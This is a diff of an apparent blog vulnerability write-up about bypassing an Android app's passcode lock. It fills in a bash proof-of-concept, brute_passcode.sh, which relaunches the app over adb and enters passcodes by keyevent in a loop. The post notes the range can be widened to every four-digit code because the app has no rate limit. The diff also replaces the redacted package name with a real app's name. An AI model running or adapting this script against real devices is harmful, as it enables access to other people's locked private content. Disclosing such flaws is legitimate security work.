@@ -54,18 +54,23 @@ e16bc6a3	device
 <p></p>
 <p>3.- After that run the <span class="payload-highlight"><b>brute_passcode.sh</b></span> script (attached) and just wait</p>
 <pre class="wp-block-code"><code>#!/usr/bin/env bash
-package_name="com.example.redacted_application"
+package_name="com.app.pornhub"
 adb shell am force-stop $package_name > /dev/null 2>&1
 adb shell monkey -p $package_name -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1
 clear
 echo
 echo "---- BRUTE FORCING SCRIPT STARTED ----"
-echo "launching REDACTED application ... DONE"
+echo "launching pornhub application ... DONE"
 # the user passcode is 5555, in this example just try 10 passcodes for the POC
 # for the full brute force just change {5550..5560} to {0000..9999}
 for i in {5550..5560}; do
     printf "trying passcode %d \r" "$i"
-    for (( j=0; j</code></pre>
+    for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+    done
+done
+echo
+echo "bypass successfully"</code></pre>
 <p><br>PS. You can change the passcode range from {5550..5560} to {0000..9999}, I've tried with all combinations and it worked successfully because there is no limit rate-limited on passcode tries.<br><br>Number event codes list (<a href="https://stackoverflow.com/a/8483797">Stack overflow reference</a>):</p>
 <pre class="wp-block-code"><code>...
 7 --&gt;  "KEYCODE_0" 
